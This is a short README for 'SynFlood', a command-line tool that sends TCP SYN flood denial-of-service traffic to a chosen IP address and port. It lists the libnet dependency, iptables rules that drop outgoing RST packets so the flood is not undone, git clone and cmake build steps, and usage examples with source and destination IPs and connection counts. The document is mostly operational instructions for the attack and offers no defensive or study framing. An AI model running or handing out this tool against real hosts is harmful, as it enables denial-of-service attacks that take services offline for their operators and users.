# SynFlood

Start a SYN flood attack to an ip address.

## Requirements

- libnet1. `libnet1-dev` under Debian.
- Root access for sending a packet.
- Its recommended to block all RST packets from the source host on the source host.
	
	```bash
	iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST RST -j DROP
	iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST ACK -j DROP
	```

## Build

1. Clone:
	
	```bash
	git clone https://github.com/TheFox/synflood.git
	```

2. In `synflood` directory, make:
	
	```bash
	mkdir -p build && cd build && cmake -DCMAKE_BUILD_TYPE=Release .. && make && make test
	```

3. Done.

## Usage

```bash
./synflood SRC DST DPT [CONNECTIONS]
```

- `SRC`: Source IP address.
- `DST`: Destination IP address.
- `DPT`: Destination port.
- `CONNECTIONS`: Number of connections.

Examples:

```bash
./synflood 192.168.241.31 192.168.1.3 80
./synflood 192.168.241.31 192.168.1.3 80 1000
```
